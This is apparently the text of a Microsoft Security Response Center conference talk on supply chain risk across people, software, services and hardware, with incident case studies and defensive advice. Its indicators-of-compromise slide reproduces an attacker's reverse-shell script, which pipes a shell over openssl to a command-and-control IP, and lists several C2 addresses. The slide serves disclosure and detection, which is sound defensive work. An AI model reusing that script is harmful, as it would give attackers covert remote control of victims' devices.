The Enemy Within
Modern Supply Chain Attacks
Eric Doerr, GM Microsoft Security Response Center (MSRC)
@edoerr

We all know the world rests on a giant turtle...
1. Terry Pratchett, The Color of Magic, 1983

Turtles all the way down...

I'm in your supply chain, and you're in mine.
We're in this together.

Am I in your supply chain?

Are you in mine?
· Linux is the most popular OS
on Azure
· >35k unique OSS projects
· >10K 3rd party tools
· Surface, Hololens, Xbox
hardware suppliers
· Server infrastructure in the
Microsoft cloud
· And more...

Media is overly focused on hardware
Supply chain > hardware

I'm not talking about...
OR
And definitely not

Evaluating supply chain risk

How we think about Supply Chain Risk

Hardware

Software

Services

People

How do we defend Microsoft?
Commonalities & differences

Microsoft environment today

Number of employees
Managed devices hitting the network
Transactions on the sales platform per day

Number of countries with Microsoft offices
On-premises workload reduction
Cloud based services

Authentication requests per month
Microsoft Teams meetings/month
Data Centers worldwide

Microsoft Cloud

Microsoft is a complex company to defend... how do we do it?

Cyber Defense Operations Center ­ Defending as One
· Centralized hubs for cybersecurity and defense; uniting personnel from each defender team
· Shared technology, analytics, playbooks
· Shared locations, and more importantly a commitment to "defend together"
· 24 x 7 x 365 protection of Microsoft platform and customers

Let's talk about people People

There are people in your supply chain

People Supply Chain Example

1

During unknown time period, a financially motivated threat actor allegedly compromises Wipro network and

gains access to multiple companies through trusted

vendor relationships

Gift Card abuse
3rd PARTY REPORTING

2 Apr 2019 CDOC teams mobilized
based on reports of potential compromise to determine the risk exposure of to Microsoft and Microsoft customers.

Credential Backdoor Lateral compromise C&C movement

Microsoft Vendors (People)

3 Apr 2019 After a thorough
investigation, no malicious activity observed within Microsoft.

Response
· Risk assessment and vendor inventory audit performed · Block newly identified malicious domains · Precautionary reset of credentials for vendor accounts · Additional monitoring of systems belonging vendor employees · Windows Defender signature deployed to detect adversary's specific Mimikatz Binary

Practical Advice
Securing people in your supply chain
· Always "assume breach" · Strict inventory of vendor & partner access · Automated policy governance where possible · Follow principle of least privilege · Provide devices and/or virtual monitoring · Any privileged access needs tighter controls (MFA etc) and
detection systems in place

Let's talk about software Software

There is software in your supply chain

Software Supply Chain Example

1 April 2018 Reports that Team Viewer
software and/or infrastructure is leveraged by threat actor

Threat Actor could leverage service to
4 install firmware or bios implants on
physical machines during OEM deployment

Machines are re-imaged
5 prior to delivery or
deployment

Potential Actions on Objective

BACKDOOR

SUPPLY CHAIN ATTACK

3rd Party Service

MALICIOUS CODE

OEM
2

3

Service is connected to internal resources for deployment of new

hardware

OEMs use service for provisioning and

May 2018

troubleshooting of physical machines

AppLocker and firewall blocking

initiated against service files and

connections

Response

Physical Machine

Theoretically an implant could remain after provisioning: · Steal data · Disrupt or deny access · Distribute and Manage Malware

· Performed audit of software usage to assess risk if software was compromised · Update policy to block remote access software · Notifications sent to impacted employees · AppLocker and firewall blocks put in place · Updated contracts with suppliers

Practical Advice
Securing Software in your supply chain

Pre-Selection

Selection

Contract

Onboard

Monitor

Terminate

Shortlist software solutions and suppliers with strong security credentials.
Kick off security engagements during RFP and shortlisting phase.

Risk Profiling & Assessment Services
Enable the selection of software solutions and suppliers which adhere to defined Microsoft Security requirements.
Perform security assurance prior to contract negotiations to enable customers/ business groups to make risk-based decision.

Standard Contract Language Review & Contract Negotiation
Consulting
Apply enforceable terms to contracts in relation to Microsoft Security and Privacy requirements.

Remediation
Ensure customers/ business groups are aware of any ongoing expectations related to their chosen software solutions and suppliers.
Ensure suppliers are committed to the requirements set forth for their software solutions and organization, and their responsibility to remediate any known or open issues.

Risk Profiling Continuous Monitoring
Perform monitoring and periodic reassessments based on the status of and changes to the risk profiles.
Investigate changes in risk assessment and move to termination if they cannot be quickly addressed.

Termination Support
Implement necessary safeguards for solutions being decommissioned and provide termination support.
Perform periodic review of software solution usage and contract information to identify solutions which are inactive or expected to be decommissioned.

Let's talk about services Services

Do you inventory every service you use?

Upstream vs. Downstream

Upstream
· DNS · PKI · Cloud service providers · VPN service providers · ISPs · Any business partner you rely
on to provide you services

Downstream
· Financial outsourcing · Content delivery networks · Distribution services (e.g.
Github, Dropbox, etc.)
· Push networks · Any business partner that helps
you provide services to your customers

Services supply chain example

Access Code 1234

Sub-processors
Phone Number Access Code

Phone Number Access Code

Telco Provider

Phone Number Access Code

MULTI-FACTOR AUTHENTICATION

1 15 Nov 2018 Techcrunch article
highlighting security research reporting an exposed database associated with an SMS subprocessor.
ERROR, NEGLECT
SCANNING

2

The data exposed encompassed SMS messages containing phone

numbers and short-term access

codes.

LEAK/EXFILTRATE DATA

ACTIONS ON THE OBJECTIVE

Response
· Inspected exposed data to evaluate risk · Expired all valid one-time tokens immediately to contain risk · Work began to investigate the scope and impact of the potential disclosure · Investigated potential attempted or successful logins · No misuse of the two-factor codes was identified

Ok, let's talk about hardware Hardware

Hardware Supply Chain Example

1 Apr 2019 The Microsoft Threat
Intelligence Center (MSTIC) discovered suspicious activity from infrastructure previously associated with the STRONTIUM targeting several 3rd party customers.

2

Internet facing video decoder device with default

credentials used to establish

a link into targeted

networks.

3 Previously patched vulnerability used on
a printer and later VOIP telephony devices scanned network.
VPN

4

Compromised account logged in to IP addresses associated with IOT devices

from external VPNs.

User error / Neglect

IoT

Scanning

Vulnerability
Service accounts do not have multi-factor authentication because they are widely used for automated and routine tasks.

Security control evasion

Credential compromise BackdoorC&C

5 Incident Responders reset
passwords, pull the hard disk of the printer, and block known domains.

Credential compromise

RECONNAISSANCE

ACTIONS ON THE OBJECTIVE

Response
· Mobilized CDOC responders to investigate and partner with 3rd party customer security teams · IOT devices were quarantined and sent for forensic analysis · Impacted service account credentials were changed · Malicious domains and IPs were blocked on affected networks · Proactively shared adversary TTPs with IOT vendors

Indicators of Compromise (1/2)
--contents of [IOT Device] file--
#!/bin/sh export [IOT Device] ="-qws -display :1 -nomouse" echo 1|tee /tmp/.c;sh -c '(until (sh -c "openssl s_client -quiet -host 167.114.153.55 -port 443 |while : ; do sh && break; done| openssl s_client -quiet -host 167.114.153.55 -port 443"); do (sleep 10 && cn=$((`cat /tmp/.c`+1)) && echo $cn|tee /tmp.c && if [ $cn -ge 30 ]; then (rm /tmp/.c;pkill -f 'openssl'); fi);done)&' &
--end contents of file--

Indicators of Compromise (2/2)

The following IP addresses are believed to have been used by the actor for command and control (C2):

167.114.153.55

94.237.37.28

82.118.242.171

31.220.61.251

128.199.199.187

More details on our blog https://msrcblog.microsoft.com/2019/08/05/corporate -iot-a-path-to-intrusion/

4 Takeaways

1
Share More
Let's make the adversaries work harder by working together.

How can we share more?
We need to change our cultural approach
· Media: "name and shame"  "learn and defend together" · Customer: "why was there an issue"  "how did they respond?" · Business: "containment & opacity"  "partnership & transparency" · Disclosure: "code defects"  "tactics that work"

2
Response matters
We should focus more on how companies respond to security events, not whether
they happen.

Remember, we're all in this together
Best Practices:
· Proactively inform customer of impact · Engage transparently and without defensiveness · Respond to reasonable requests for validation · Learn from mistakes

3
Sweat the small stuff
Adversaries will find the path of least resistance.

4
Embrace the whole
People + Software + Services + Hardware = Supply Chain

Thanks!

